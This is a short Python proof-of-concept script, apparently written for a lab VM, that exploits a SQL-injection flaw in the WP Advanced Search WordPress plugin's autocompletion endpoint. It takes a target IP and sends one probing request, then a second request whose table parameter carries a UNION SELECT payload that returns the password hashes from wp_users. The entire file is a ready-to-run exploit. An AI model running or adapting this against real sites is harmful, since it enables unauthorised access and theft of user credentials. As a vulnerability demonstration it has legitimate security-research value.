import requests
import sys

# Ensure the user provides the IP address as a command-line argument
if len(sys.argv) != 2:
    print("Usage: python3 script.py <IP_ADDRESS>")
    sys.exit(1)

# Extract the IP address from command-line arguments
vm_ip = sys.argv[1]

# Construct the base URL using the provided IP address
base_url = f"http://{vm_ip}/wp-content/plugins/wp-advanced-search/class.inc/autocompletion/autocompletion-PHP5.5.php"

# First request parameters
params1 = {
    "q": "admin",
    "t": "wp_users --",
    "f": "user_login",
    "type": "",
    "e": ""
}

# Send the first request
response1 = requests.get(base_url, params=params1)
print("Response for the first URL (demonstrates that exploit can work):")
print(response1.text)

# Second request parameters
params2 = {
    "q": "admin",
    "t": "wp_users UNION SELECT user_pass FROM wp_users--",
    "f": "user_login",
    "type": "",
    "e": ""
}

# Send the second request
response2 = requests.get(base_url, params=params2)
print("\nResponse for the second URL, which includes the password hash! (uh oh):")
print(response2.text)
